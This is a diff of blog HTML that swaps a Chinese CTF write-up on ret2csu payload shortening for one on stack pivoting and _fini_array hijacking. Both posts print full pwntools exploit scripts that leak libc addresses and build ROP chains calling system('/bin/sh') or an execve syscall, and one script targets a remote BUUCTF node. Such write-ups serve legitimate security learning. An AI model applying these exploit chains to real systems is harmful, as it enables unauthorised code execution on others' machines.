@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                ret2csu—缩短payload
+                                栈迁移总结
                             </h1>
                             
                                 <!--en-->
@@ -175,24 +175,13 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-02</a>
+                                Date: <a href="#">2020-09-27</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">9.4
+                                    href="#">4.5
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1753</a></span>
+                                    <span class="post-words">words:<a href="#">992</a></span>
                                     
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://l3mon629.github.io/tag/uryU9whCl/">ret2csu</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/us84qNRgFI/">rop</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/LszkIW-Qj5/">栈溢出</a>
-                                
-                            </span>
-                                        
                                             Views:
                                             <span data-hk-page="current"> - </span>
                                             
@@ -201,362 +190,185 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>起因是这样的，跟一个pwn师傅聊天的时候，他发给我了一道题，说很有意思，我就打开来看了看<br>
-main函数</p>
-<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  write(1, &quot;welcome~\n&quot;, 9uLL);
-  vul();
-  return 0;
-}
-</code></pre>
-<p>vul函数</p>
-<pre><code class="language-c">ssize_t vul()
-{
-  char buf; // [rsp+0h] [rbp-80h]
-
-  return read(0, &amp;buf, 0x100uLL);
-}
-</code></pre>
-<p>就这？<br>
-我他妈直接ret2csu<br>
-先写一下原理吧，到时候复习比较方便</p>
-<h1 id="ret2csu">ret2csu</h1>
-<h2 id="__libc_csu_init">__libc_csu_init</h2>
-<p>重点关注这个函数<br>
-为啥呢，因为它里面有很好的gadget<br>
-<img src="https://l3mon629.github.io/post-images/1599021047508.png" alt="" loading="lazy"><br>
-我们知道在64位环境下，前六个参数是由寄存器来传递的，分别是rdi rsi rdx rcx r8 r9<br>
-那我们看这两个片段<br>
-第一个是pop片段</p>
-<pre><code>.text:000000000040060A                 pop     rbx
-.text:000000000040060B                 pop     rbp
-.text:000000000040060C                 pop     r12
-.text:000000000040060E                 pop     r13
-.text:0000000000400610                 pop     r14
-.text:0000000000400612                 pop     r15
-.text:0000000000400614                 retn
-</code></pre>
-<p>这一串pop和retn分别打到了寄存器上然后还能retn，但是我们需要的是那六个寄存器，但是看前一个片段</p>
-<pre><code>.text:00000000004005F0                 mov     rdx, r13
-.text:00000000004005F3                 mov     rsi, r14
-.text:00000000004005F6                 mov     edi, r15d
-.text:00000000004005F9                 call    qword ptr [r12+rbx*8]
-</code></pre>
-<p>我们可以利用这个来调整寄存器这样edi，rsi，rdx前三个寄存器便可以由我们来控制了</p>
-<h2 id="利用">利用</h2>
-<p>我们看ctfwiki<br>
-<img src="https://l3mon629.github.io/post-images/1599021305612.png" alt="" loading="lazy"><br>
-然后wiki给了一个几乎万能的exp</p>
-<pre><code class="language-python">from pwn import *
-from LibcSearcher import LibcSearcher
-
-#context.log_level = 'debug'
-
-level5 = ELF('./level5')
-sh = process('./level5')
-
-write_got = level5.got['write']
-read_got = level5.got['read']
-main_addr = level5.symbols['main']
-bss_base = level5.bss()
-csu_front_addr = 0x0000000000400600
-csu_end_addr = 0x000000000040061A
-fakeebp = 'b' * 8
-
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = 'a' * 0x80 + fakeebp
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
-        r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += 'a' * 0x38
-    payload += p64(last)
-    sh.send(payload)
-    sleep(1)
-
-
-sh.recvuntil('Hello, World\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(sh.recv(8))
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-execve_addr = libc_base + libc.dump('execve')
-log.success('execve_addr ' + hex(execve_addr))
-##gdb.attach(sh)
-
-## read(0,bss_base,16)
-## read execve_addr and /bin/sh\x00
-sh.recvuntil('Hello, World\n')
-csu(0, 1, read_got, 16, bss_base, 0, main_addr)
-sh.send(p64(execve_addr) + '/bin/sh\x00')
-
-sh.recvuntil('Hello, World\n')
-## execve(bss_base+8)
-csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
-sh.interactive()
-</code></pre>
-<p>这个来泄漏libc是通过write函数，难度上来说比puts要更难了<br>
-思路就是先泄漏libc，然后劫持read函数，向bss段上写入/bin/sh，和system之类的系统函数，然后劫持程序流到bss段拿shell</p>
-<h1 id="解题">解题</h1>
-<p>那我们直接照抄exp就好了，反正大同小异（打脸</p>
+                            <p>昨天某师傅问到了栈迁移，由于舍友非要拉👴去通宵，今天睡到下午六点才醒，特此来总结下</p>
+<p>栈迁移其实不太难，本博文主要来总结下栈迁移的妙用：劫持_fini_array</p>
+<h2 id="栈迁移">栈迁移</h2>
+<p>我们先来总结下栈迁移<br>
+什么是栈迁移呢？顾名思义就是把栈迁移到了另外一个地方。<br>
+那么我们什么时候需要栈迁移呢？</p>
+<p>设想这样一个情景，我们可以溢出两个字长的空间，一个字长用来覆盖old bp寄存器的值，一个用来改写ret返回地址，但是程序没有后门，我们无法利用一个字长来ret2libc，这个时候如果我们能够在一个地址段（比如bss段之类的地方）能够写入大量字节，那么我们便可以ret2libc来拿到shell，所以我们只需要在某个地址段布置好ROP链，然后利用两次 leave ret 来控制程序的执行流程</p>
+<h3 id="一个32位的例题">一个32位的例题</h3>
+<p>buu的一道题目，[Black Watch 入群题]PWN<br>
+漏洞函数：<br>
+<img src="https://l3mon629.github.io/post-images/1601212782753.png" alt="" loading="lazy"><br>
+我们能够在bss段写入0x200个字节同时能够溢出8字节的数据<br>
+利用前文分析的手法，不难写出exp</p>
 <pre><code class="language-python">from pwn import *
 from LibcSearcher import *
-context.log_level = 'debug'
 
-elf = ELF('./pwn2')
-p = process('./pwn2')
-#libc = ELF(&quot;./libc-2.23.so&quot;)
+binary = './spwn'
 
-write_got = elf.got['write']
+#libc = ELF('./libc.so.6')
+
+local = 0
+if local == 1:
+    p = process(binary)
+else:
+    p = remote('node3.buuoj.cn',25304)
+
+elf = ELF(binary)
+
+def dbg():
+	context.log_level = 'debug'
+
+#dbg()
+
+write_plt = elf.plt['write']
+main_addr = elf.sym['main']
 read_got = elf.got['read']
-main_addr = elf.symbols['main']
-print(hex(main_addr))
-bss_base = elf.bss()
-csu_front_addr = 0x4005F0
-#csu_end_addr = 0x40060A
-csu_end_addr = 0x40060A
+pop_ebp = 0
 
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = b'a' * 0x88
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += b'a' * 0x38
-    payload += p64(main_addr)
-    p.send(payload)
-    sleep(1)
+payload = p32(pop_ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x4)	# mov esp,ebp;   pop ebp;   pop eip;
+p.sendafter('What is your name?',payload)
 
-p.recvuntil('welcome~\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
+payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511)
+p.sendafter('What do you want to say?',payload)
 
-write_addr = u64(p.recv(8))
-gdb.attach(p)
+read_addr = u32(p.recv(4))
+print hex(read_addr)
 
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-print(hex(libc_base))
-system = libc_base + libc.dump('system')
-binsh = libc_base + libc.dump('str_bin_sh')
+libc = LibcSearcher('read',read_addr)
+libc_base = read_addr - libc.dump('read')
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
 
-'''
-libc = ELF('./libc-2.23.so')
-libc_base = write_addr - libc.symbols['write']
-print('libcbase ----&gt; ' + hex(libc_base))
-system = libc_base + libc.symbols['system']
-binsh = libc_base + libc.search(b'/bin/sh').__next__()
-'''
+payload = p32(pop_ebp) + p32(system_addr) + p32(system_addr) + p32(binsh_addr)
+p.sendafter('What is your name?',payload)
 
+payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) 	#addr:level
+p.sendafter('What do you want to say?',payload)
 
-payload = b'a' * 0x88
-payload += p64(0x40060A) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0)
-payload += p64(csu_front_addr)
-payload += b'a' * 0x38
-payload += p64(main_addr)
-
-p.recvuntil('~\n')
-p.send(payload)
-
-p.send(p64(execve))
-p.send('/bin/sh\0')
-sleep(1)
-#p.send(p64(execve) + b'/bin/sh\x00')
-</code></pre>
-<p>想象是美好的，但是很快就发现了问题<br>
-程序根本无法跳转到main函数，思考了好久就是没想通<br>
-后来经过师傅提醒发现payload长度超了<br>
-只允许read 0x100个字节，那我们只好缩减payload<br>
-经过调试发现rbx寄存器本来就是0，所以我们可以省略p64(rbx)，结果发现长度正好为0x100<br>
-然后第二次向bss写数据的时候就又不行了，这个时候rbx就不是0了<br>
-所以换个思路，就用普通栈溢出的思路，找到binsh和system的地址，直接执行<br>
-由于我本地的环境有很大问题，LibcSearcher不准，每次偏移都差0x1000，我通过gdb的magic找到了system的地址，但是实在找不到binsh的地址了，所以就此作罢，但是理论上是绝对可以打通的<br>
-我贴一下最后的exp</p>
-<pre><code class="language-python">from pwn import *
-from LibcSearcher import *
-context.log_level = 'debug'
-
-elf = ELF('./pwn2')
-p = process('./pwn2')
-#libc = ELF(&quot;./libc-2.23.so&quot;)
-
-write_got = elf.got['write']
-read_got = elf.got['read']
-main_addr = elf.symbols['main']
-print(hex(main_addr))
-bss_base = elf.bss()
-csu_front_addr = 0x4005F0
-#csu_end_addr = 0x40060A
-csu_end_addr = 0x40060B
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = b'a' * 0x88
-    payload += p64(csu_end_addr) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += b'a' * 0x38
-    payload += p64(main_addr)
-    p.send(payload)
-    sleep(1)
-
-p.recvuntil('welcome~\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(p.recv(8))
-gdb.attach(p)
-
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-print(hex(libc_base))
-system = libc_base + libc.dump('system')
-binsh = libc_base + libc.dump('str_bin_sh')
-
-'''
-libc = ELF('./libc-2.23.so')
-libc_base = write_addr - libc.symbols['write']
-print('libcbase ----&gt; ' + hex(libc_base))
-system = libc_base + libc.symbols['system']
-binsh = libc_base + libc.search(b'/bin/sh').__next__()
-'''
-p.recvuntil('~\n')
-payload = b'a' * 0x88
-
-pop_ret = 0x400613
-payload += p64(pop_ret) + p64(binsh) + p64(system)
-print(&quot;binsh -----&gt; &quot; + hex(binsh))
-print(&quot;system -----&gt; &quot; + hex(system))
-p.sendline(payload)
 p.interactive()
 </code></pre>
-<p>然后贴一下我魔改了师傅的exp</p>
-<pre><code class="language-python">from pwn import  *
-from LibcSearcher import LibcSearcher
+<h2 id="劫持_fini_array">劫持_fini_array</h2>
+<p>原理在这个地方：https://bbs.pediy.com/thread-259298.htm<br>
+我们直接看例题，原理很简单，我们通过例题来详细说明一下如何利用栈迁移来劫持_fini_array</p>
+<h3 id="memory-monster-ii">Memory Monster II</h3>
+<p>静态编译的题目，有canary<br>
+我们通过alt+t来定位到start函数<br>
+<img src="https://l3mon629.github.io/post-images/1601214393023.png" alt="" loading="lazy"><br>
+start函数的r8寄存器存了__libc_csu_fini函数，rdi寄存器存了main函数地址，我们跟进去<br>
+<img src="https://l3mon629.github.io/post-images/1601214483753.png" alt="" loading="lazy"><br>
+有任意地址写0x18字节的漏洞</p>
+<p>我们可以劫持_fini_array[0]为__libc_csu_fini函数，_fini_array[1]为main函数，只要我们不改写_fini_array[0]，我们就能拥有任意地址无限字节写入的能力<br>
+思路如下：<br>
+1，改写_fini_array，获得无限字节写入的能力<br>
+2，在_fini_array + 0x10的位置布置rop链<br>
+3，改写_fini_array[0]为leave ret，_fini_array[1]为ret，从而进行栈迁移<br>
+至于2，3步为什么呢？下面我们绘图来仔细说明一下<br>
+首先第三步，我们为什么能够进行栈迁移呢，因为在__libc_csu_fini里面有一个lea指令可以改变rbp的值为_fini_array[0]的值<br>
+<img src="https://l3mon629.github.io/post-images/1601215048346.png" alt="" loading="lazy"><br>
+详细流程如下：<br>
+<img src="https://l3mon629.github.io/post-images/1601215100277.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1601215116079.png" alt="" loading="lazy"></p>
+<p>只要第三步理解了，第二步和第一步都特别简单，通过调用syscall就能拿shell<br>
+<img src="https://l3mon629.github.io/post-images/1601215196762.png" alt="" loading="lazy"></p>
+<p>直接看exp吧；</p>
+<pre><code class="language-python">from pwn import *
 
-def ret2libc(leak, func, path=''):
-	if path == '':
-		libc = LibcSearcher(func, leak)
-		base = leak - libc.dump(func)
-		system = base + 0x3f550 - 0x1000
-		wrong = base + libc.dump('system')
-		print(hex(wrong))
-		binsh = base + libc.dump('str_bin_sh')
-		print('str 的偏移为 ： ' + hex(libc.dump('str_bin_sh')))
-		print('system 的偏移为 ：' + hex(libc.dump('system')))
-
-	else:
-		libc = ELF(path)
-		base = leak - libc.sym[func]
-		system = base + libc.sym['system']
-		binsh = base + libc.search(b'/bin/sh').__next__()
-
-	return (system,binsh,base)
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-	# pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    # or csu(0,1,got_write,1,got_write,8,main) The csu functions of different programs need to be analyzed concretely
-    payload = b'a' * 0x88
-    payload += p64(gadget_pop)  + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(gadget_call)
-    payload += b'a' * 0x38
-    payload += p64(last)
-    p.send(payload)
-    return payload
-
-
-s       = lambda data               :p.send(str(data))
-sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
-sl      = lambda data               :p.sendline(str(data))
-sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
-r       = lambda num=4096           :p.recv(num)
-ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
-itr     = lambda                    :p.interactive()
-uu32    = lambda data               :u32(data.ljust(4,b'\0'))
-uu64    = lambda data               :u64(data.ljust(8,b'\0'))
-leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
-
-context.log_level = 'DEBUG'
-binary = './pwn2'
-context.binary = binary
-elf = ELF(binary,checksec=False)
+p = process('./main')
 
 
 def dbg():
-	gdb.attach(p)
-	pause()
+	context.log_level = 'debug'
+
+context.terminal = ['tmux','splitw','-h']
 
 
-p = process(binary)
-#p = remote(&quot;47.95.195.235&quot;,44002)
-#libc = ELF(&quot;./libc-2.23.so&quot;)
-main = 0x400587
-gadget_pop = 0x40060B
-gadget_call =0x4005F0
-got_write = elf.got['write']
+__libc_csu_fini = 0x402CB0
+_fini_array_0 = 0x4B80B0
+_fini_array_1 = 0x4B80B8
+target = _fini_array_0 + 0x10
+main = 0x401C1D
 
-p.recvuntil('\n')
-csu(0,1,got_write,8,got_write,1,main)
-gdb.attach(p)
+print &quot;================ gadget =================&quot;
 
-#ru(&quot;welcome~\n&quot;)
+pop_rax_ret = 0x0000000000448fcc 		#	 pop rax ; ret
+pop_rdi_ret = 0x0000000000401746 		#	 pop rdi ; ret
+pop_rsi_ret = 0x0000000000406f80 		#	 pop rsi ; ret
+pop_rdx_ret = 0x0000000000448415 		#	 pop rdx ; ret
 
-write_addr = uu64(r(6))
-print('write ---&gt; ' + hex(write_addr))
-system,binsh,base = ret2libc(write_addr,'write','')
-print('system ----&gt; ' + hex(system))
-print('binsh ----&gt; ' + hex(binsh))
-print(hex(base))
+syscall = 0x0000000000402514 			# 	 syscall
+binsh_addr = 0x0000000000492895 		#	 /bin/sh
 
-pop_ret = 0x400613
+leave_ret = 0x0000000000401cf3 			#	 leave ; ret
+ret = 0x0000000000401016 				#	 ret
 
-payload3 = b'a' * 136 + p64(pop_ret) + p64(binsh) + p64(system)
-sla(&quot;welcome~\n&quot;,payload3)
-itr()
+pop_rdx_rsi_ret = 0x000000000044baf9 	#	pop rdx ; pop rsi ; ret
+
+print &quot;================ gadget =================&quot;
+
+def change_memory(addr,data):
+	p.recvuntil('addr:')
+	p.sendline(addr)
+	p.recvuntil('data:')
+	p.send(data)
+
+print &quot;============= step 1: Get the ability to write infinite address ========&quot;
+
+addr = p64(_fini_array_0)
+payload1 = p64(__libc_csu_fini) + p64(main)		
+change_memory(addr,payload1)
+
+print &quot;=========== step 2: Design ROP chain ==========&quot;
+
+addr = p64(target)
+payload2 = p64(pop_rax_ret) + p64(59) 	
+change_memory(addr,payload2)
+
+addr = p64(target + 0x10)
+payload3 = p64(pop_rdi_ret) + p64(binsh_addr)							
+change_memory(addr,payload3)
+
+addr = p64(target + 0x20)
+payload4 = p64(pop_rsi_ret) + p64(0) 		
+change_memory(addr,payload4)
+
+addr = p64(target + 0x30)
+payload5 = p64(pop_rdx_ret)	+ p64(0)	
+change_memory(addr,payload5)
+
+addr = p64(target + 0x40)
+payload6 = p64(syscall) 					
+change_memory(addr,payload6)
+
+print &quot;======== step 3: Stack migration to the rop chain =======&quot;
+
+addr = p64(_fini_array_0)
+payload7 = p64(leave_ret) + p64(ret)							
+change_memory(addr,payload7)
+
+p.interactive()
 </code></pre>
-<p>orz<br>
-wtcl</p>
 
                         </div>
                         
                             <div class="post-toc">
                                 <ul class="markdownIt-TOC">
-<li><a href="#ret2csu">ret2csu</a>
+<li>
 <ul>
-<li><a href="#__libc_csu_init">__libc_csu_init</a></li>
-<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+<li><a href="#%E6%A0%88%E8%BF%81%E7%A7%BB">栈迁移</a>
+<ul>
+<li><a href="#%E4%B8%80%E4%B8%AA32%E4%BD%8D%E7%9A%84%E4%BE%8B%E9%A2%98">一个32位的例题</a></li>
 </ul>
 </li>
-<li><a href="#%E8%A7%A3%E9%A2%98">解题</a></li>
+<li><a href="#%E5%8A%AB%E6%8C%81_fini_array">劫持_fini_array</a>
+<ul>
+<li><a href="#memory-monster-ii">Memory Monster II</a></li>
+</ul>
+</li>
+</ul>
+</li>
 </ul>
 
                             </div>
@@ -572,7 +384,7 @@ wtcl</p>
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/ret2csu-suo-duan-payload/">https://l3mon629.github.io/post/ret2csu-suo-duan-payload/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/zhan-qian-yi-zong-jie/">https://l3mon629.github.io/post/zhan-qian-yi-zong-jie/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -587,9 +399,9 @@ wtcl</p>
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/ret2csu-suo-duan-payload/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/ret2csu-suo-duan-payload/&sharesource=qzone&title=ret2csu—缩短payload&pics=https://l3mon629.github.io/images/avatar.png?v=1601215230073&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/ret2csu-suo-duan-payload/&sharesource=weibo&title=ret2csu—缩短payload + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601215230073 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/zhan-qian-yi-zong-jie/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/zhan-qian-yi-zong-jie/&sharesource=qzone&title=栈迁移总结&pics=https://l3mon629.github.io/images/avatar.png?v=1601215230073&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/zhan-qian-yi-zong-jie/&sharesource=weibo&title=栈迁移总结 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601215230073 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -598,20 +410,6 @@ wtcl</p>
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
-                        
-                        <a href="https://l3mon629.github.io/tag/uryU9whCl/">#
-                                                ret2csu
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/us84qNRgFI/">#
-                                                rop
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/LszkIW-Qj5/">#
-                                                栈溢出
-                                                    </a>
-                                                    
-                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -624,13 +422,9 @@ wtcl</p>
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/">
-                                                                                            gyctf_2020_some_thing_exceting
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/">
-                                                                                                    一道got表可写的off-by-one — hitcontraining_heapcreator
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/vim-bian-ji-qi/">
+                                                                                                    vim编辑器
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
